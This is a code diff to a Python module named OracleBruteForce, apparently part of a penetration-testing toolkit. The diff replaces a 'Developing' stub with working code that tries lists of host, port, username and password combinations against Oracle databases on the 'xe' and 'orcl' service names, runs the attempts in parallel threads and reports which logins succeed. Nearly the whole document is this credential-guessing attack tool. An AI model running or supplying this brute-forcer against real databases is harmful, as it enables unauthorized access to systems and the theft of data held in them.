@@ -4,8 +4,11 @@
 @Author: reber
 @Mail: reber0ask@qq.com
 @Date: 2019-09-25 21:11:15
-@LastEditTime: 2019-10-14 15:24:54
+@LastEditTime: 2019-12-28 14:36:15
 '''
+
+import cx_Oracle
+from concurrent.futures import ThreadPoolExecutor
 
 class OracleBruteForce(object):
     """OracleBruteForce"""
@@ -17,23 +20,27 @@ class OracleBruteForce(object):
 
     def worker(self,hpup):
         host,port,user,pwd = hpup
+        oracle_tns1 = "{}/{}@{}:{}/xe".format(user,pwd,host,port)
+        oracle_tns2 = "{}/{}@{}:{}/orcl".format(user,pwd,host,port)
         try:
-            conn = pymysql.connect(host=host,port=port,user=user,passwd=pwd,
-                                connect_timeout=self.timeout,charset="utf8")
+            conn = cx_Oracle.connect(oracle_tns1)
+        except cx_Oracle.DatabaseError as e:
+            try:
+                conn = cx_Oracle.connect(oracle_tns2)
+            except Exception as e:
+                hook_msg((False,host,port,user,pwd))
+            else:
+                hook_msg((True,host,port,user,pwd))
+                conn.close()
         except Exception as e:
             hook_msg((False,host,port,user,pwd))
-            # logger.error(str(e))
         else:
             hook_msg((True,host,port,user,pwd))
-        finally:
             conn.close()
 
     def run(self):
-        print("Module OracleBruteForce is Developing...")
-        # ip_list = [x[0] for x in self.result]
-        # with ThreadPoolExecutor(max_workers = self.thread_num) as executor:
-        #     for host,port,user,pwd in self.targets:
-        #         f = executor.submit(self.worker,(host,port,user,pwd))
-
+        with ThreadPoolExecutor(max_workers = self.thread_num) as executor:
+            for host,port,user,pwd in self.targets:
+                f = executor.submit(self.worker,(host,port,user,pwd))
 
 bruter = OracleBruteForce
